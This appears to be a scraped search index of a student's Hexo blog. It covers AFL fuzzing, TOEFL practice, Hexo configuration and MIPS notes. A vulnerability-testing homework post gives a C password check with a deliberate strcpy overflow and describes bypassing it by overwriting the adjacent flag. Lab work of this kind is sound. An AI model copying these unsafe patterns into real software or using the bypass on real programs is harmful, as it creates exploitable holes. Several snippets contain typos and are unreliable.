&#x2F;&#x2F;说明在dos和unix环境下,用&quot;&quot;扩起来的表示其是一个字符串，代表着一个参数 return 0;&#125; 编译器默认只输入一个参数，即 argc=1 argv[0]=.exe文件路径 使用cmd输入多个参数 输入exe文件，参数间用空格隔开 参考 https://www.cnblogs.com/yanglai/p/6927151.html https://blog.csdn.net/dcrmg/article/details/51987413","categories":[],"tags":[]},{"title":"AFL工作过程分析","slug":"AFL工作过程分析","date":"2020-04-13T10:13:52.000Z","updated":"2020-04-20T07:11:03.435Z","comments":true,"path":"2020/04/13/AFL工作过程分析/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/04/13/AFL%E5%B7%A5%E4%BD%9C%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/","excerpt":"","text":"使用方法export CC&#x3D;afl-clang；export CXX&#x3D;afl-clang++；test.c为待测程序代码afl-gcc -g -o afl_test afl_test.c对那些可以直接从stdin读取输入的目标程序来说，语法如下：.&#x2F;afl-fuzz -i testcase_dir -o findings_dir &#x2F;path&#x2F;to&#x2F;program […params…]对从文件读取输入的目标程序来说，要用“@@”，语法如下：.&#x2F;afl-fuzz -i testcase_dir -o findings_dir &#x2F;path&#x2F;to&#x2F;program @@ 程序一#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; #include &lt;signal.h&gt;void test (char *buf) &#123; int n = 0; if(buf[0] == 'a') n++; if(buf[1] == 'f') n++; if(buf[2] == 'l') n++; if(buf[3] == '!') n++; if(n == 4) &#123; printf(\"awesome!\\n\"); raise(SIGSEGV); //异常退出 &#125;else&#123; printf(\"wrong!\\n\"); &#125;&#125; int main(int argc, char *argv[]) &#123; FILE* fp; fp = fopen(argv[1],\"r\"); char buf[100]; fgets(buf,1024,fp); //溢出？ test(buf); return 0;&#125; 在输入文件夹（这里是fuzz_in)建立testcase文件，内容位任一可以使程序正常运行的输入 afl-gcc -g -o .&#x2F;test .&#x2F;test.cafl-fuzz -i fuzz_in -o fuzz_out .&#x2F;test @@ 使用afl-clang： 分析出了1个uniq crashes 使用afl-gcc 分析出了4个uniq crashes #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void why_here(void)&#123; printf(&quot;why r u here?\\n&quot;); exit(0);&#125;void f()&#123; char buff[2]; buff[2]&#x3D;(int)why_here; reutrn;&#125;void main()&#123; f(); return;&#125;","categories":[{"name":"AFL","slug":"AFL","permalink":"https://gitee.com/michelle19l/michelle19l/categories/AFL/"}],"tags":[{"name":"AFL","slug":"AFL","permalink":"https://gitee.com/michelle19l/michelle19l/tags/AFL/"},{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"}]},{"title":"hexo butterfly主题配置补充","slug":"hexo-butterfly主题配置补充","date":"2020-04-13T06:47:03.000Z","updated":"2020-04-14T14:25:55.635Z","comments":true,"path":"2020/04/13/hexo-butterfly主题配置补充/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/04/13/hexo-butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%A1%A5%E5%85%85/","excerpt":"","text":"详细配置内容请参考官方配置文档 本文仅对个人在配置中遇到的问题进行记录 hexo-tag-aplayer安装npm install hexo-tag-aplayer 配置hexo new page music Meting 在hexo/_config.yml中添加代码 aplayer: meting: true 设置hexo/_config.yml中的external_link external_link: enable: true # Open external links in new tab field: post # Apply to the whole site,设置为post exclude: '' 语法&#123;% meting &quot;id&quot; &quot;server&quot; &quot;type&quot; %&#125; 选项 默认值 描述 id 必须值 歌曲 id / 播放列表 id / 相册 id / 搜索关键字 server 必须值 音乐平台: netease, tencent, kugou, xiami, baidu type 必须值 song, playlist, album, search, artist fixed false 开启固定模式 mini false 开启迷你模式 loop all 列表循环模式：all, one,none order list 列表播放模式： list, random volume 0.7 播放器音量 lrctype 0 歌词格式类型 listfolded false 指定音乐播放列表是否折叠 storagename metingjs LocalStorage 中存储播放器设定的键名 autoplay true 自动播放，移动端浏览器暂时不支持此功能 mutex true 该选项开启时，如果同页面有其他 aplayer 播放，该播放器会暂停 listmaxheight 340px 播放列表的最大长度 preload auto 音乐文件预载入模式，可选项： none, metadata, auto theme #ad7a86 播放器风格色彩设置 样例：添加至index.md # 南开大学闭馆音乐&#123;% meting &quot;2999255636&quot; &quot;netease&quot; &quot;playlist&quot; &quot;theme:#FF4081&quot; &quot;mode:circulation&quot; &quot;mutex:true&quot; &quot;listmaxheight:340px&quot; &quot;preload:auto&quot; %&#125; 同时也可以添加至其它页面中 #南开大学闭馆音乐 参考： https://dsanying.coding.me/HEXO%E6%8F%92%E4%BB%B6-hexo-tag-dplayer/ https://github.com/MoePlayer/hexo-tag-aplayer https://www.jianshu.com/p/f1005ae09e5a hexo-douban安装模块依赖我们使用时可以先安装依赖模块，在GitBash中使用以下命令： $ npm install hexo-douban --save 站点配置文件中添加配置然后我们再在Hexo站点根目录配置文件_config.xml中的末尾添加如下配置： douban: user: mythsman builtin: false book: title: &#39;This is my book title&#39; quote: &#39;This is my book quote&#39; movie: title: &#39;This is my movie title&#39; quote: &#39;This is my movie quote&#39; game: title: &#39;This is my game title&#39; quote: &#39;This is my game quote&#39; timeout: 10000 上面参数说明： user: 你的豆瓣ID.打开豆瓣，登入账户，然后在右上角点击 “个人主页” ，这时候地址栏的URL大概是这样：”https://www.douban.com/people/xxxxxx/“ ，其中的”xxxxxx”就是你的个人ID了。 builtin: 是否将生成页面的功能嵌入hexo s和hexo g中，默认是false,另一可选项为true(1.x.x版本新增配置项)。 title: 该页面的标题. quote: 写在页面开头的一段话,支持html语法. timeout: 爬取数据的超时时间，默认是 10000ms ,如果在使用时发现报了超时的错(ETIMEOUT)可以把这个数据设置的大一点。 由于hexo-douban 是默认抓取豆瓣读书、豆瓣电影以及豆瓣游戏的，如果只想要其中一部分，可以把其它部分在上述配置文件中去掉即可。 启动那么我们如何去使用这个呢？ 我们只需要在GitBash中输入以下命令：hexo clean &amp;&amp; hexo douban -bgm &amp;&amp; hexo g &amp;&amp; hexo s即可，注意其中开启hexo-douban的命令中，-bgm代表的是book、game、movie三个参数，如果只需要其中的一部分就只带你想要的那些参数。 另外注意的是，由于hexo douban的简写也是hexo d，与hexo deploy的简写指令hexo d冲突，因此在进行二者部署的时候，只能都打全名而不能打简写形式。 测试上面都没问题之后，我们只需要在站点目录下测试http://localhost:4000/books或者http://localhost:4000/movies等，如果看到页面了就说明成功了。 样例在hexo/_config.yml中添加 # 豆瓣douban: user: 215086406 builtin: true movie: title: &#39;This is my movie title&#39; quote: &#39;This is my movie quote&#39; book: title: &#39;This is my book title&#39; quote: &#39;This is my book quote&#39; music: title: &#39;This is my music title&#39; quote: &#39;This is my music quote&#39; photo: title: &#39;This is my photo title&#39; quote: &#39;This is my photo quote&#39; timeout: 10000 参考： https://github.com/mythsman/hexo-douban https://bestzuo.cn/posts/hexo-douban.html 标签外挂使用说明&#123;% note default %&#125;default 提示块标籤&#123;% endnote %&#125;&#123;% note primary no-icon %&#125;primary 提示块标籤&#123;% endnote %&#125;&#123;% note success %&#125;success 提示块标籤&#123;% endnote %&#125;&#123;% note info %&#125;info 提示块标籤&#123;% endnote %&#125;&#123;% note warning %&#125;warning 提示块标籤&#123;% endnote %&#125;&#123;% note danger %&#125;danger 提示块标籤&#123;% endnote %&#125; 样例 default 提示块标籤 primary 提示块标籤 success 提示块标籤 info 提示块标籤 warning 提示块标籤 danger 提示块标籤 使用说明Page Front-matter---title:date:type: (tags,link,categories这三个页面需要配置)comments: (是否需要显示评论，默认true)description:top_img: (设置顶部图)mathjax:katex:aside:--- Post Front-matter---title:date:tags:categories:keywords:description:top_img: (除非特定需要，可以不写)comments 是否显示评论(除非设置false,可以不写)cover: 缩略图toc: 是否显示toc (除非特定文章设置，可以不写)toc_number: 是否显示toc数字 (除非特定文章设置，可以不写)copyright: 是否显示版权 (除非特定文章设置，可以不写)mathjax:katex:hide: 是否隐藏文章top: 是否置顶---","categories":[{"name":"问题解决","slug":"问题解决","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"}],"tags":[{"name":"主题配置","slug":"主题配置","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/"}]},{"title":"托福阅读精读","slug":"英语/托福/托福阅读精读","date":"2020-04-13T02:04:18.000Z","updated":"2020-04-24T00:41:29.506Z","comments":true,"path":"2020/04/13/英语/托福/托福阅读精读/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/04/13/%E8%8B%B1%E8%AF%AD/%E6%89%98%E7%A6%8F/%E6%89%98%E7%A6%8F%E9%98%85%E8%AF%BB%E7%B2%BE%E8%AF%BB/","excerpt":"","text":"TPO46The Commercial Revolution in Medieval Europe中世纪欧洲商业革命 社会学 Paragraph 1Beginning in the 1160s, the opening of new silver mines in northern Europe led to the minting(铸造) and circulation of vast quantities of silver coins.The widespread use of cash greatly increased the volume(量) of international trade.Business procedures changed radically. The individual traveling merchant who alone handled virtually(几乎，差不多) all aspects of exchange evolved into an operation involving three separate types of merchants: the sedentary merchant who ran the “home office” financing and organizing the firm’s entire export-import trade; the carriers who transported goods by land and sea; and the company agents resident in cities abroad who, on the advice of the home office, looked after sales and procurements(采购). Paragraph 2Commercial correspondence(商业通信), unnecessary when one businessperson oversaw everything and made direct bargains with buyers and sellers, multiplied. commercial correspendence mutiplied. 商业通信被大量使用 Regular courier service(快递服务) among commercial cities began. Commercial accounting became more complex when firms had to deal with shareholders(股东), manufacturers, customers, branch offices, employees, and competing firms. Tolls on roads(公路收费) became high enough to finance(融资) what has been called a road revolution, involving new surfaces(路面) and bridges, new passes(隧道) through the Alps, and new inns and hospices(招待所) for travelers. The growth of mutual trust among merchants facilitated the growth of sales on credit(赊账) and led to new developments in finance, such as the bill of exchange(汇票) , a device that made the long, slow, and very dangerous shipment of coins unnecessary. The ventures(n.(尤指有风险的) 企业，商业，投机活动，经营项目;) of the German Hanseatic League illustrate these advancements. The Hanseatic League was a mercantile association of European towns dating from 1159. The league grew by the end of the fourteenth century to include about 200 cities from Holland to Poland. Across regular, well- defined trade routes along the Baltic and North seas, the ships of league cities carried furs, wax, copper, fish, grain, timber, and wine. These goods were exchanged for finished products(成品) , mainly cloth and salt, from western cities. raw marterial 原材料 semi-finished product 半成品 finished product 成品 At cities such as Bruges and London, Hanseatic merchants secured special trading concessions(贸易优惠) , exempting(免除) them from all tolls and allowing them to trade at local fairs(集市). concession n.让步; 妥协; 承认; 给予; 许可; 减价; (对某类人的) 减价票; exempt v.免除; 豁免; Hanseatic merchants established foreign trading centers, the most famous of which was the London Steelyard, a walled(封闭的) community with warehouses, offices, a church, and residential quarters(住宅区) for company representatives. Paragraph 3By the late thirteenth century, Hanseatic merchants had developed an important business technique, the business register. Merchants publicly recorded their debts and contracts and received a league guarantee for them. This device proved a decisive factor in the later development of credit and commerce in northern Europe. Paragraph 4These developments added up to what one modern scholar has called “a commercial revolution.” In the long run(归根到底), the commercial revolution of the High Middle Ages (a d 1000-1300) brought about radical change(根本性的变化) in European society. One remarkable(显著的) aspect of this change was that the commercial classes constituted(组成) a small part of the total population—never more than 10 percent. They exercised an influence(施加影响) far in excess of(超过) their numbers. The commercial revolution created a great deal of new wealth, which meant a higher standard of living. The existence of wealth did not escape the attention of kings and other rulers. Wealth could be taxed, and through taxation, kings could create strong and centralized states. In the years to come, alliances with the middle classes were to enable kings to weaken aristocratic interests(利益) and build the states that came to be called modern. Paragraph 5The commercial revolution also provided the opportunity for thousands of agricultural workers to improve their social position. social position 社会位置 social status 社会地位 社会地位指一个人在社会中所获得的经常依赖于其社会位置的尊敬和声望等等 The slow but steady transformation of European society from almost completely rural and isolated to relatively more urban constituted the greatest effect of(影响) the commercial revolution that began in the eleventh century. Even so, merchants and business people did not run medieval communities(掌控中世纪社会), except in central and northern Italy and in the county of Flanders. Most towns remained small. The nobility and churchmen determined the predominant(主要的) social attitudes(社会态度),values(价值观) , and patterns of thought and behavior(思想和行为模式) . The commercial changes of the eleventh through fourteenth centuries did however,lay the economic foundation for the development of urban life and culture. lie the foundation for sth. 为……打下基础","categories":[{"name":"TOEFL","slug":"TOEFL","permalink":"https://gitee.com/michelle19l/michelle19l/categories/TOEFL/"}],"tags":[{"name":"英语","slug":"英语","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%8B%B1%E8%AF%AD/"},{"name":"英语阅读","slug":"英语阅读","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%8B%B1%E8%AF%AD%E9%98%85%E8%AF%BB/"}]},{"title":"漏洞测试作业四：OLLYDBG软件破解","slug":"漏测作业/漏测作业四","date":"2020-04-10T10:06:07.000Z","updated":"2020-06-12T04:04:20.287Z","comments":true,"path":"2020/04/10/漏测作业/漏测作业四/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/04/10/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%9B%9B/","excerpt":"","text":"IDA查看伪代码利用OllyDBG进行准确字符串填充长度判断 1对如下程序编译产生debug模式下的exe程序 #include &lt;stdio.h&gt;#include &lt;iostream&gt;#define PASSWORD \"1234567\"int verify_password(char* password)&#123; int authenticated; char buffeer[12];//add local buff to be overflowed authenticated=strcmp(password,PASSWORD); strcpy(buffer,password); return authenticated;&#125;void main()&#123; int valid_flag=0; char password[1024]; while(1) &#123; printf(\"please input password: \"); scanf(\"%s\",password); valid_flag=verify_password(password); if(valid_flag) printf(\"incorrect password!\\n\\n\"); else &#123; printf(\"Congratulation! You have passed the verification!\\n\"); break; &#125; &#125;&#125; 2 题目： 对上述EXE程序，用IDA查看逆向分析的伪代码，利用OllyDBG进行准确字符串填充长度判断，并完成漏洞利用的实验，使得输入一定字符串后验证通过。 用IDA查看逆向分析伪代码 OllyDBG进行字符串填充长度判断 authenticated buffer 可以判断出buffer长12个字节 完成漏洞测试实验 思路：用非法的超长密码修改buffer临界变量authenticated 输入长为十二字节的数据，字符串共13个字节，末尾为’\\0’,覆盖密码输入不正确时authenticated的01 测试成功","categories":[{"name":"漏洞测试作业","slug":"漏洞测试作业","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"IDA","slug":"IDA","permalink":"https://gitee.com/michelle19l/michelle19l/tags/IDA/"},{"name":"ollydbg","slug":"ollydbg","permalink":"https://gitee.com/michelle19l/michelle19l/tags/ollydbg/"}]},{"title":"数据库上机L5","slug":"数据库/数据库上机L5","date":"2020-04-09T16:09:36.000Z","updated":"2020-07-13T01:25:02.389Z","comments":true,"path":"2020/04/10/数据库/数据库上机L5/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/04/10/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BAL5/","excerpt":"","text":"优化查询速度——数据库索引 数据库索引 B/B+树 -&gt; 范围检索 哈希表 -&gt; 值检索 MyISAM用B+树作为索引，叶节点的data域存放的是数据记录的地址","categories":[{"name":"数据库","slug":"数据库","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"综合写作 2020-4","slug":"英语/托福/综合写作-2020-4","date":"2020-04-06T12:02:33.000Z","updated":"2020-04-06T12:56:44.185Z","comments":true,"path":"2020/04/06/英语/托福/综合写作-2020-4/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/04/06/%E8%8B%B1%E8%AF%AD/%E6%89%98%E7%A6%8F/%E7%BB%BC%E5%90%88%E5%86%99%E4%BD%9C-2020-4/","excerpt":"","text":"TPO49我的答案In the reading passage, the author states that humpback whales may navigate by stars to migrate long distances. However, the professor refutes this idea and thinks the reasons listed in the reading are unconvincing. First of all, the author claims that humpback whales are intelligent enough to navigate by stars, while the professor states that there is no correlation between intelligence and an animal’s ability to use stars for navigation. For example, some birds such as ducks evolved the ability for navigation by stars. And ducks are only of general cognitive ability, not as advanced as humpback whales’. So, it seems that there is no real connection between intelligence and the ability to use stars for navigation. In addition, the author argues that humpback whales have no land features in the ocean to help them migrate in straight lines for long distance. So, they have to rely on stars. However, the professor challenges this statement by pointing out that the presence of biomagnetite in the brains of humpback whales enables them to be sensitive to Earth’s magnetic field. It is Earth’s magnetic field that helps humpback whales to migrate. Finally, the professor cast doubt on what is stated in the reading that humpback whales look at the stars through spy-hopping, which is a rare behavior among marine animals. He claims that there is no connection between spy-hopping and looking at stars since there are other animals exhibit this behavior but do not migrate, such as sharks. Also, humpback whales do spyhop during the day when there are no stars can be seen in the sky. So, the statement that humpback whales adopt spyhopping to look at stars is not convincing. 范文In the reading passage, the author states that humpback whales may navigate by stars to migrate long distances. However, the professor refutes this idea and thinks the reasons listed in the reading are unconvincing. First of all, the author claims that humpback whales are intelligent enough to navigate by stars, while the professor states that there is no correlation between intelligence and an animal’s ability to use stars for navigation. For example, some birds such as ducks evolved the ability for navigation by stars. And ducks are only of general cognitive ability, not as advanced as humpback whales’. So, it seems that there is no real connection between intelligence and the ability to use stars for navigation. In addition, the author argues that humpback whales have no land features in the ocean to help them migrate in straight lines for long distance. So, they have to rely on stars. However, the professor challenges this statement by pointing out that the presence of biomagnetite in the brains of humpback whales enables them to be sensitive to Earth’s magnetic field. It is Earth’s magnetic field that helps humpback whales to migrate. Finally, the professor cast doubt on what is stated in the reading that humpback whales look at the stars through spy-hopping, which is a rare behavior among marine animals. He claims that there is no connection between spy-hopping and looking at stars since there are other animals exhibit this behavior but do not migrate, such as sharks. Also, humpback whales do spyhop during the day when there are no stars can be seen in the sky. So, the statement that humpback whales adopt spyhopping to look at stars is not convincing.","categories":[],"tags":[]},{"title":"托福综合写作模板","slug":"英语/托福/托福综合写作模板","date":"2020-04-06T11:42:46.000Z","updated":"2020-04-24T00:41:12.370Z","comments":true,"path":"2020/04/06/英语/托福/托福综合写作模板/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/04/06/%E8%8B%B1%E8%AF%AD/%E6%89%98%E7%A6%8F/%E6%89%98%E7%A6%8F%E7%BB%BC%E5%90%88%E5%86%99%E4%BD%9C%E6%A8%A1%E6%9D%BF/","excerpt":"","text":"The author and the speaker are discussing 【阅读第一段信息总结，即阅读和听力在讨论的话题】. The author thinks that 【阅读立场，往往在阅读第一段最后一句】. However, the speaker casts doubt on the reading’s position. Firstly, the autor says that 【阅读第二段第一句&amp;最后一句信息总结；阅读和听力都讨论的点】. However, the speaker opposes the saying that 【听力对阅读的反驳事实信息，往往为1-2点】. Secondly, the author believes that 【阅读第三段第一句&amp;最后一句信息总结；阅读和听力都讨论的点】. In contrast, the speaker disagrees with it and says that 【听力对阅读的反驳事实信息，往往为1-2点】. Thirdly, the author thinks that 【阅读第四段第一句&amp;最后一句信息总结；阅读和听力都讨论的点】. On the contrary, the speaker contradicts it by saying that 【听力对阅读的反驳事实信息，往往为1-2点】.","categories":[{"name":"TOEFL","slug":"TOEFL","permalink":"https://gitee.com/michelle19l/michelle19l/categories/TOEFL/"}],"tags":[{"name":"英语","slug":"英语","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%8B%B1%E8%AF%AD/"},{"name":"写作","slug":"写作","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%86%99%E4%BD%9C/"}]},{"title":"AFL源码分析","slug":"AFL源码分析","date":"2020-04-06T07:09:09.000Z","updated":"2020-04-20T03:15:04.988Z","comments":true,"path":"2020/04/06/AFL源码分析/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/04/06/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"[toc] 文件处理过程 源码分析afl-gcc afl-gcc是gcc/g++的wrapper,调用gcc/g++ afl-gcc设置-B direcotry gcc/g++调用afl对应的cpp、cc1/cc1/plus、as、ld。 /* afl-gcc.c:main() */find_as(argv[0]); //查找argv[0]的目录(即afl-gcc的目录)供 edit_params()函数使用edit_params(argc, argv); //设置 -B 选项和参数execvp(cc_params[0], (char**)cc_params); //调用 gcc afl-as AFL的代码插桩，是在将源文件编译为汇编代码后，通过afl-as完成的 afl-as是as的封装 afl-as会在汇编代码的代码相应位置插入统计代码，然后调用真正的as进行汇编。统计代码是在afl-as.h文件中，afl-as负责找到每个 basic block 插入 afl-as.h中的统计代码。afl-as.c:main()主要调用了两个函数： &#x2F;*afl-as.c:main()*&#x2F;edit_params(argc, argv); &#x2F;&#x2F;调整传递给真正的汇编器&#96;as&#96;的参数。add_instrumentation(); &#x2F;&#x2F;判断分支，插入统计代码 add_instrumentation() Process input file, generate modified_file. Insert instrumentation in all the appropriate places. 查找代码部分 只对代码部分插桩 利用代码文件的符号排列格式进行判断 如果是代码部分则会将instr_ok置1 查找基本块 方法 标识符：以 “点号”(.)开始,以“冒号”(:)结束，中间是字母数字组合 跳转指令： 一般是进行比较根据比较结果来决定是否跳转(如 jnz xxx)，条件跳转指令的下一条也是一个 basic block 的开始处。 如果是跳转指令则在指令后插入统计代码 instrument_next置1 插桩fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE)); 这里通过fprintf()将格式化字符串添加到汇编文件的相应位置 R(MAP_SIZE)即为0到MAP_SIZE之间的一个随机数。 eg.trampoline_fmt_32 static const u8* trampoline_fmt_32 &#x3D; &quot;\\n&quot; &quot;&#x2F;* --- AFL TRAMPOLINE (32-BIT) --- *&#x2F;\\n&quot; &quot;\\n&quot; &quot;.align 4\\n&quot; &quot;\\n&quot; &quot;leal -16(%%esp), %%esp\\n&quot; &quot;movl %%edi, 0(%%esp)\\n&quot; &quot;movl %%edx, 4(%%esp)\\n&quot; &quot;movl %%ecx, 8(%%esp)\\n&quot; &quot;movl %%eax, 12(%%esp)\\n&quot; &quot;movl $0x%08x, %%ecx\\n&quot; &quot;call __afl_maybe_log\\n&quot; &quot;movl 12(%%esp), %%eax\\n&quot; &quot;movl 8(%%esp), %%ecx\\n&quot; &quot;movl 4(%%esp), %%edx\\n&quot; &quot;movl 0(%%esp), %%edi\\n&quot; &quot;leal 16(%%esp), %%esp\\n&quot; &quot;\\n&quot; &quot;&#x2F;* --- END --- *&#x2F;\\n&quot; &quot;\\n&quot;; 这一段汇编代码，主要的操作是： 保存edi等寄存器 将ecx的值设置为fprintf()所要打印的变量内容 调用方法__afl_maybe_log() 恢复寄存器 __afl_maybe_log是插桩代码所执行的实际内容 fork server确定性 -fork- 子进程随机性 插桩 补充知识：gcc/cc1The g++ is a compiler driver. It knows how to invoke the actual compiler (cc1plus), assembler and linker. It does not know how to parse or compile the sources. fork()fork函数将运行着的程序分成2个（几乎）完全一样的进程，每个进程都启动一个从代码的同一位置开始执行的线程。这两个进程中的线程继续执行，就像是两个用户同时启动了该应用程序的两个副本。 参考网页 https://xz.aliyun.com/t/4628 https://www.dazhuanlan.com/2020/03/04/5e5f13ab06638/ https://rk700.github.io/2017/12/28/afl-internals/ https://stackoverflow.com/questions/19899750/what-is-the-difference-between-gcc-g-and-cc1-cc1plus https://baike.baidu.com/item/fork/7143171?fr=aladdin","categories":[{"name":"AFL","slug":"AFL","permalink":"https://gitee.com/michelle19l/michelle19l/categories/AFL/"}],"tags":[{"name":"AFL","slug":"AFL","permalink":"https://gitee.com/michelle19l/michelle19l/tags/AFL/"},{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"}]},{"title":"独立写作 2020-4","slug":"英语/托福/独立写作-2020-4","date":"2020-04-06T06:45:12.000Z","updated":"2020-04-24T00:41:06.190Z","comments":true,"path":"2020/04/06/英语/托福/独立写作-2020-4/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/04/06/%E8%8B%B1%E8%AF%AD/%E6%89%98%E7%A6%8F/%E7%8B%AC%E7%AB%8B%E5%86%99%E4%BD%9C-2020-4/","excerpt":"我的答案 范文 对比学习","text":"我的答案 范文 对比学习 TPO49 独立写作Do you agree or disagree with the following statement?The ability to maintain friendships with a small number of people over a long period of time is more important for happiness than the ability to make many new friends easily. Use specific reasons and examples to support your answer. 我的答案Nowadays, with the development of society, men have to contact more people than before, so it is essential to be capable to make many new friends easily. But some people still think the ability to maintain friendships with a small number of people over a long period of time is more import for happiness. Personally, I agree on the latter one, that maintain friendships with a few people contribute to happiness more, and my reasons are elaborated as below. First, it’s a confirmation of my personality. Because the ones know me for a long period of time know more about my drawbacks, and they still choose to be a friend of mine even though they know my drawbacks. And they think my good points weigh more than shortcomings. Also one will not maintain friendships with those who are selfish and just think of themselves. It shows a trust of my quality to maintain friendship with me. Sure I will feel happier with this kind of confirmation. Second, that spend more time with specific old friends can be relaxing. As a result of knowing each other much more than new friends. We share a lot of memories and we can talk about that. And we know the past of each other, the good ones, and the bad ones. For example, when I’m upset, my old friends can avoid talking about the points which could make me sadder, because they know more about my stories. Also they are more likely to know which words could make me happier. Admittedly, I can learn a lot of good thing from my friends, thus having the ability to make many new friends easily means I can learn more. However, friendship should be pure and without just thinking about benefits and having a few ones whom I can talk with from the bottom of my heart is enough. To sum up, the ability to maintain friendships with a small group of people over a long period of time is more important to happiness. As this ability can contribute to a more reliable and relaxing friendship. 范文Friendship and kinship contribute a lot to one’s happiness. Then, the question goes, “does the ability to main long-term friendships with a small number of people matters more than the ability to make many new friends easily?” My answer is “yes”. First of all, old friends usually show stronger loyalty than those newly-acquainted fellows. That means, no matter what happens, these friends would always stand by your side and provide you with supports unconditionally. However, this merit is usually missing in short-term friendship. Last year when I was in hospital, 2 of my old friends took turns to take care of me, accompanying me to endure the very hard time. However, few of my “wide-range” new friends even came to visit me. It is clearly that long-term friendship is much more reliable and the ability to main such kind of relationship is more critical. In addition, old friends tend to show more understanding of you, being familiar with your hobbies, interests and some other peculiarities. So, it is usually more comfortable for me to be with my old friends. For instance, I am lactose intolerant and every time when I have dinner with my old friends, they would skip anything that contains milk or cheese, ordering food based on my favor. Contrary to my old friends’ consideration, those newly-acquainted fellows are inclined to show surprise about my intolerance and still pick the food of lactose they prefer. So, to me, old friends are much more considerate and contribute more to my happiness. Admittedly, the ability to make new friends easily are quite important for a person to get new ideas, broadening their views from different groups of people. However, compared with the ability to maintain long-term friendship, it still plays a less significant role for one’s happiness. To sum up, one’s happiness is consist of various parts, including self-achievement, security and etc. And I believe long-term friendship is of higher importance than other parts. As a result, the ability to maintain long-term friendship with a small group of people is much more important. 对比学习","categories":[{"name":"TOEFL","slug":"TOEFL","permalink":"https://gitee.com/michelle19l/michelle19l/categories/TOEFL/"}],"tags":[{"name":"英语","slug":"英语","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%8B%B1%E8%AF%AD/"},{"name":"写作","slug":"写作","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%86%99%E4%BD%9C/"}]},{"title":"计组笔记","slug":"计组笔记","date":"2020-04-06T02:14:21.000Z","updated":"2020-04-06T07:00:05.891Z","comments":true,"path":"2020/04/06/计组笔记/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/04/06/%E8%AE%A1%E7%BB%84%E7%AC%94%E8%AE%B0/","excerpt":"陌生知识点","text":"陌生知识点 第二章 指令：计算机的语言 背指令 寄存器 函数调用过程中 寄存器 作用 $a0~a3 用于传递参数的四个寄存器 $v0~v1 用于返回值的两个值寄存器 $ra 用于返回起始点的返回地址寄存器 $t0~t9 10个临时寄存器，在过程调用中不必被调用者（被调用的过程）保存 $s0~t7 8个保留寄存器，在过程调用中必须被保存（一旦被使用，由被调用者保存和恢复） 保留 不保留 保存指针寄存器：$s0~s7 临时寄存器：$t0~t7 栈指针寄存器：$sp 参数寄存器：$a0~a3 返回地址寄存器： 返回值寄存器：$v0~v1 栈指针以上的栈 栈指针一下的栈 名称 寄存器号 用途 调用时是否保存 $zero 0 常数0 不适用 $v0~v1 2~3 计算结果和表达式求值 否 $a0~a3 4~7 参数 否 $t0~t7 8~15 临时变量 否 $s0~s7 16~23 保存的寄存器 是 $t8~t9 24~25 更多的临时变量 否 $gp 28 全局指针 是 $sp 29 栈指针 是 $fp 30 帧指针 是 $ra 31 返回地址 是 叶函数调用示例 C: int fact (int n)&#123; if (n&lt;1) return 1 else return (n*fact(n-1));&#125; MIPS fact: addi $sp, $sp, -8; # adjust stack for 2 items sw $ra, 4($sp); # save the return address sw $a0, 0($sp); # save the argument n stli $t0, $a0, 1 # test for n&lt;1beq $t0, $zero, L1 # if n &gt;&#x3D; 1, go to L1addi $v0, $zero, 1 # reurn 1addi $sp, $sp, 8 # pop 2 items off stackjr $ra # return to callerL1: addi $a0, $a0, -1 # n &gt;&#x3D; 1: argument gets (n-1) jal fact # call fact with (n-1) # fact 的返回位置lw $a0, 0($sp) # return from jal: restore argument nlw $ra, 4($sp) # restore the return addressaddi $sp, $sp, 8 # adjust stack pointer to pop 2 itemsmul $v0, $a0, $v0 # return n*fact(n-1)jr $ra #return to the 